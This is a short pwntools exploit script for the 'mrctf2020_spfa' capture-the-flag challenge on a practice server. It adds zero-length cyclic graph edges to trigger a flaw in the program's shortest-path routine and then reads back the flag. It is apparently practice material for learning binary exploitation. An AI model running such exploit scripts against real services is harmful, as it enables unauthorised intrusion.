from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mrctf2020_spfa')
io = remote('node4.buuoj.cn', 25735)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('mrctf2020_spfa')


def add(From, to, size):
    io.sendlineafter('4. exit:\n', '1')
    io.sendlineafter('input from to and length:\n', str(From))
    io.sendline(str(to))
    io.sendline(str(size))


def spfa(From, to):
    io.sendlineafter('4. exit:\n', '2')
    io.sendlineafter('input from and to:\n', str(From))
    io.sendline(str(to))


def pwn():
    add(0, 1, 0)
    add(1, 0, 0)
    spfa(0, 1)
    io.sendlineafter('4. exit:\n', '3')
    flag = io.recv()
    log.success(str(flag))


if __name__ == '__main__':
    pwn()